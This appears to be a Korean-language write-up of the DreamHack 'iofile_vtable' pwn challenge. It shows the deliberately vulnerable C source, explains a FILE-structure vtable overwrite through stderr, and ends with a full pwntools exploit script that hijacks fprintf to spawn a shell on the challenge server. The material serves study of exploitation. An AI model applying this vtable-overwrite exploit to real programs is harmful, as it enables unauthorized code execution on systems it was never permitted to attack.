---
ctf_name: "DreamHackWargame"
challenge_name: "iofile_vtable"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "kjs24"
date: "2026-07-07"
points: 0
tags: [vtable_overwrite]
---

# 문제명
iofile_vtable
## 문제 설명

> 문제에서 주어진 설명을 여기에 작성합니다.


- 바이너리 파일, c 소스코드 주어짐

## 풀이

### 분석

/////소스코드/////
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char name[8];
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    int idx = 0;
    int sel;

    initialize();

    printf("what is your name: ");
    read(0, name, 8);
    while(1) {
        printf("1. print\n");
        printf("2. error\n");
        printf("3. read\n");
        printf("4. chance\n");
        printf("> ");

        scanf("%d", &sel);
        switch(sel) {
            case 1:
                printf("GOOD\n");
                break;
            case 2:
                fprintf(stderr, "ERROR\n");
                break;
            case 3:
                fgetc(stdin);
                break;
            case 4:
                printf("change: ");
                read(0, stderr + 1, 8);
                break;
            default:
                break;
            }
    }
    return 0;
}
////소스코드/////
-get_shell 함수가 플래그 따줌
-name 전역변수에 원하는 값 쓰기 가능
-change 작업에서 stderr의 IO_FILE 구조체 쪽에 원하는 값 쓰기 가능함. stderr + 1은 FILE 구조체를 한 번 더 더한 값이다 이것은 vtable 포인터가 있는 곳임 
-error 작업에서 fprintf의 인자로 stderr를 사용 이 코드는 stderr vtable의 XS_PUTN을 호출한다. 즉, change에서 XS_PUTN의 오프셋에 맞춘 가짜 vtable을 change의 페이로드에 넣어준다면 원하는 함수 실행 가능함.


### 취약점

-get_shell 함수가 플래그 따줌
-name 전역변수에 원하는 값 쓰기 가능
-change 작업에서 stderr의 IO_FILE 구조체 쪽에 원하는 값 쓰기 가능함. stderr + 1은 FILE 구조체를 한 번 더 더한 값이다 이것은 vtable 포인터가 있는 곳임 
-error 작업에서 fprintf의 인자로 stderr를 사용 이 코드는 stderr vtable의 XS_PUTN을 호출한다. 즉, change에서 XS_PUTN의 오프셋에 맞춘 가짜 vtable을 change의 페이로드에 넣어준다면 원하는 함수 실행 가능함.

### 익스플로잇

1.XS_PUTN 오프셋, 필요 함수 주소등을 구해놓음
2.fake_vtable로 사용할 name 변수에 GET_SHELL 주소를 넣음
3.change 작업을 선택하고 stderr의 IOFILE vtable 포인터에 fake_vtable을 넣음. 이 값은 name 주소에서 vtable 상에 있는 XS_PUTN의 오프셋 주소를 뺸 값인데 fake_vtable로 사용하는 만큼 이런식으로 주소 맞춰서 보내야함
4.error 작업을 수행해서 fprintf(stderr, "ERROR\n"); 호출하게함. 이 과정에서 stderr vtable의 XS_PUTN 자리에 있는 값을 수행하면서 GET_SHELL이 호출됨.

*주의점!!!
vtable XS_PUTN 자리에 그냥 GET_SHELL 주소를 넣으면 안됨. 아래 페이로드처럼 GET_SHELL 주소를 가리키는 포인터 주소를 넣어야함. 왜냐면 vtable에서 함수들 참조할 때도 포인터로 함수 주소 가리키는 형식으로 작동하기 떄문임. 그래서 name 포인터 이용안하고 vtable 포인터 자리에 "GET_SHELL 주소 - XS_PUTN 오프셋" 값 넣으면 에러남.

```python
# 페이로드
from pwn import *

context.binary = elf = ELF("./iofile_vtable")
context.log_level = "debug"


XS_PUTN = 0x38
GET_SHELL = elf.symbols["get_shell"]
NAME = elf.symbols["name"]
FAKE_VTABLE = NAME - XS_PUTN

p = remote('host3.dreamhack.games', 13939)

p.sendafter(b"what is your name: ", p64(GET_SHELL))

p.sendlineafter(b"> ", b"4")
p.sendafter(b"change: ", p64(FAKE_VTABLE))


p.sendlineafter(b"> ", b"2")

p.interactive()

```


## 플래그

```
DH{REDACTED}
```

## 배운 점

iofile vtable overwrite 이런거에 대한 개념이 없었는데 이 문제를 풀면서 배웠다. 다른 포너블 심화 기법들의 필요성도 느껴서 공부의 동기부여가 됨.
